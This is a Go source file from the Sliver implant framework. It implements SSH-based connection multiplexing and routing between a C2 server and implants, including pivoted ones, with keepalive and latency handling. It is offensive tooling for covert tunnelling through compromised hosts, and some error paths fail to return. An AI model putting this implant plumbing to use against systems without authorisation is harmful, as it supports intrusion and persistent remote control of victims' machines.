package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"fmt"
	"sync"
	"time"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Comm - Wrapper around a net.Conn, adding SSH infrastructure for encryption and tunneling
// to an implant. To be noted, this Comm can be either in a client or in a server position:
// C2 Server ---> Implant Mux (here we are the server accepting SSH)
// Implant Mux --> Pivoted implant Mux (here we are the client)
type Comm struct {
	// Core
	SessionID     uint32            // Any multiplexer's physical connection is tied to an implant.
	RemoteAddress string            // The multiplexer may be tied to a pivoted implant.
	sshConn       ssh.Conn          // SSH Connection, that we will mux
	clientConfig  *ssh.ClientConfig // We are the talking to the C2 server.
	serverConfig  *ssh.ServerConfig // We are the pivot of an implant

	// Connection management
	requests <-chan *ssh.Request   // Keep alive
	inbound  <-chan ssh.NewChannel // Inbound mux requests
	mutex    *sync.RWMutex         // Concurrency management.
	pending  int
}

// NewComm - Creates a SSH-based connection multiplexer.
func NewComm() (mux *Comm) {
	mux = &Comm{
		clientConfig: &ssh.ClientConfig{},
		serverConfig: &ssh.ServerConfig{},
		mutex:        &sync.RWMutex{},
	}
	return
}

// serveActiveConnection - Serves all outbound (server <- implant) and inbound (server -> implant) connections.
func (comm *Comm) serveActiveConnection() {
	defer func() {
		// {{if .Config.Debug}}
		log.Printf("Closing SSH client connection (Mux remote addr: %s)...", comm.RemoteAddress)
		// {{end}}
		err := comm.sshConn.Close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error closing SSH connection: %s", err.Error())
			// {{end}}
		}
		// Remove this multiplexer from our active sockets.
		Comms.Remove(comm.RemoteAddress)
	}()

	// For each incoming stream request, process concurrently. Blocking
	for in := range comm.inbound {
		go comm.handleServerInbound(in)
	}
}

// handleConnInbound - Handle, validate and pipe a single logical connection (blocking)
func (comm *Comm) handleServerInbound(ch ssh.NewChannel) {

	// Parse incoming connection request details:
	// UUID-RANDOM-32H3-32HJ proto lhost:lport rhost:rport
	info := &sliverpb.ConnectionInfo{}
	err := proto.Unmarshal(ch.ExtraData(), info)
	if info.ID == "" || err != nil {
		// {{if .Config.Debug}}
		log.Printf("rejected connection: (bad info payload: %s)", info.ID)
		// {{end}}
		return
	}
	// Find the route for this connection.
	route, found := Routes.Active[info.ID]
	if !found {
		err := ch.Reject(ssh.Prohibited, "NOID")
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("rejected connection: no route found for ID %s)", info.ID)
			// {{end}}
			return
		}
	}

	// Accept stream and five to route.
	stream, reqs, err := ch.Accept()
	if err != nil {
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("failed to accept stream (ID %s): %s", info.ID, err.Error())
			// {{end}}
		}
	}
	go ssh.DiscardRequests(reqs)

	// Add conn stats.
	route.pending++
	comm.pending++
	defer func() {
		route.pending--
		comm.pending--
	}()

	// The route will handle the stream.
	routeForwardConn(route, info, stream)
}

// func (m *Comm) handleServerOutbound(ch ssh.NewChannel) {
//         if m.sshConn == nil {
//                 // {{if .Config.Debug}}
//                 log.Printf("Tried to open channel on nil SSH connection")
//                 // {{end}}
//                 return
//         }
//         dst, reqs, err := m.sshConn.OpenChannel("route", ch.ExtraData())
//         if err != nil {
//                 // {{if .Config.Debug}}
//                 log.Printf("Failed to open Session RPC channel: %s", err.Error())
//                 // {{end}}
//                 ch.Reject(ssh.ConnectionFailed, err.Error())
//                 return
//         }
//         go ssh.DiscardRequests(reqs)
//         src, srcReqs, err := ch.Accept()
//         if err != nil {
//                 // {{if .Config.Debug}}
//                 log.Printf("Failed to open Session RPC channel: %s", err.Error())
//                 // {{end}}
//                 return
//         }
//         go ssh.DiscardRequests(srcReqs)
//
//         // {{if .Config.Debug}}
//         log.Printf("Piping connection stream.")
//         // {{end}}
//
//         // Pipe output
//         transport(src, dst)
// }

// NumStreams - Return the number of connections going through this comm.
func (comm *Comm) NumStreams() int {
	return comm.pending
}

// serverRequests - Handles all requests coming from the implant comm. (latency checks, close requests, etc.)
func (comm *Comm) serveRequests() {

	for req := range comm.requests {

		// If ping, respond keepalive
		if req.Type == "keepalive" {
			err := req.Reply(true, []byte{})
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error replying to request")
				// {{end}}
			}
		}

		// If latency, respond time.Now as string, for double check
		if req.Type == "latency" {
			t := fmt.Sprintf("%d", time.Now().UnixNano())
			err := req.Reply(true, []byte(t))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error replying to request")
				// {{end}}
			}
		}
	}
}

// checkLatency - get latency for this tunnel.
func (comm *Comm) checkLatency() {
	t0 := time.Now()
	_, _, err := comm.sshConn.SendRequest("latency", true, []byte{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Could not check latency: %s", err.Error())
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("Latency: %s", time.Since(t0))
	// {{end}}
}
